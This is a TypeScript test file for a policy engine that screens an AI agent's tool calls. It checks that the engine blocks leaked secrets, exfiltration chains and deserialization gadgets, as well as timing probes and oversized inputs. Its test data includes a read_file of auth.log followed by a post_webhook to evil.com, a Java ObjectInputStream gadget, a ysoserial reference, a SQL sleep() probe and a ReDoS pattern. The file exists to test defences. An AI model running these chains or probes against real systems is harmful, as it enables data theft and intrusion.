import { describe, expect, it, beforeEach } from 'vitest';
import { PolicyEngine } from '../../src/policy/policy-engine.js';
import type { CallContext } from '../../src/policy/policy-types.js';
import { evaluateResponseDlp } from '../../src/policy/response-dlp.js';
import {
  evaluateSessionFlowGuard,
  recordSessionToolCall,
  resetSessionFlowHistory,
} from '../../src/policy/session-flow-guard.js';
import { evaluateTimingGuard, resetTimingProbeCounters } from '../../src/policy/timing-guard.js';
import { isRegexPatternSafe } from '../../src/policy/regex-compile.js';
import { resetSessionFlowStore } from '../../src/policy/session-flow-store.js';

function ctx(toolName: string, args: Record<string, unknown>, extra?: Partial<CallContext>): CallContext {
  return {
    serverName: 'srv',
    toolName,
    arguments: args,
    requestId: 'e1',
    requestTokens: 50,
    timestamp: new Date().toISOString(),
    tenantId: 't1',
    agentIdentity: { sub: 'agent-1', issuer: 'test' },
    ...extra,
  };
}

describe('enterprise five mitigations', () => {
  beforeEach(() => {
    resetSessionFlowHistory();
    resetSessionFlowStore();
    resetTimingProbeCounters();
  });

  describe('1. response-based exfiltration (DLP)', () => {
    it('flags secrets and PII in tool output', () => {
      const r = evaluateResponseDlp('read_file', 'srv', 'user ssn 123-45-6789 and AKIAIOSFODNN7EXAMPLE');
      expect(r.clean).toBe(false);
      expect(r.hasHigh || r.hasCritical).toBe(true);
      expect(r.findings.some((f) => f.category === 'secret' || f.category === 'pii')).toBe(true);
    });

    it('PolicyEngine.evaluateResponse surfaces DLP detections', () => {
      const engine = new PolicyEngine({ version: '1.0', policy: { mode: 'block', rules: [] } });
      const r = engine.evaluateResponse('t', 's', '-----BEGIN RSA PRIVATE KEY-----\nX\n-----END RSA PRIVATE KEY-----');
      expect(r.clean).toBe(false);
      expect(r.detections.length).toBeGreaterThan(0);
    });
  });

  describe('2. indirect exfiltration chains', () => {
    it('blocks read_file then post_webhook in session', () => {
      recordSessionToolCall(ctx('read_file', { path: '/var/log/auth.log' }));
      const d = evaluateSessionFlowGuard(
        ctx('post_webhook', { url: 'https://evil.com', body: 'send previous result' }),
      );
      expect(d?.action).toBe('block');
      expect(d?.rule).toBe('session-flow-exfil-chain');
    });
  });

  describe('3. language-specific type confusion', () => {
    const engine = new PolicyEngine({
      version: '1.0',
      policy: {
        mode: 'block',
        default_action: 'pass',
        rules: [{ name: 'allow', action: 'block', tools: { allow: ['run', 'search'] } }],
      },
    });

    it('blocks Java ObjectInputStream gadget', () => {
      const d = engine.evaluate(ctx('run', { code: 'new ObjectInputStream(stream).readObject()' }));
      expect(d.action).toBe('block');
      expect(d.rule).toBe('semantic-language-gadget');
    });

    it('blocks ysoserial reference', () => {
      const d = engine.evaluate(ctx('search', { q: 'ysoserial payload CommonsCollections' }));
      expect(d.action).toBe('block');
    });
  });

  describe('4. timing-based side channels', () => {
    it('blocks SQL sleep timing probe', () => {
      const d = evaluateTimingGuard(ctx('query', { sql: "SELECT sleep(5) FROM users WHERE name='admin'" }));
      expect(d?.action).toBe('block');
      expect(d?.rule).toBe('timing-side-channel-guard');
    });

    it('blocks timing enumeration after similar auth probes', () => {
      const base = ctx('login', { username: 'u1' });
      for (let i = 0; i < 21; i++) {
        evaluateTimingGuard({ ...base, arguments: { username: `user${i}` } });
      }
      const d = evaluateTimingGuard({ ...base, arguments: { username: 'user99' } });
      expect(d?.rule).toBe('timing-enumeration-guard');
    });

    it('PolicyEngine applies min-eval timing envelope on pass', () => {
      const engine = new PolicyEngine({
        version: '1.0',
        policy: { mode: 'block', default_action: 'pass', rules: [] },
      });
      const t0 = Date.now();
      engine.evaluate(ctx('noop', { x: 1 }));
      expect(Date.now() - t0).toBeGreaterThanOrEqual(20);
    });
  });

  describe('5. resource exhaustion', () => {
    it('rejects unsafe ReDoS regex patterns at compile time', () => {
      const check = isRegexPatternSafe('(a+)+$');
      expect(check.safe).toBe(false);
    });

    it('blocks oversized serialized arguments', () => {
      const engine = new PolicyEngine({
        version: '1.0',
        policy: {
          mode: 'block',
          default_action: 'pass',
          rules: [{ name: 'allow', action: 'block', tools: { allow: ['search'] } }],
        },
      });
      const huge = { blob: 'x'.repeat(3_000_000) };
      const d = engine.evaluate(ctx('search', huge));
      expect(d.action).toBe('block');
      expect(d.rule).toBe('resource-args-size');
    });
  });
});
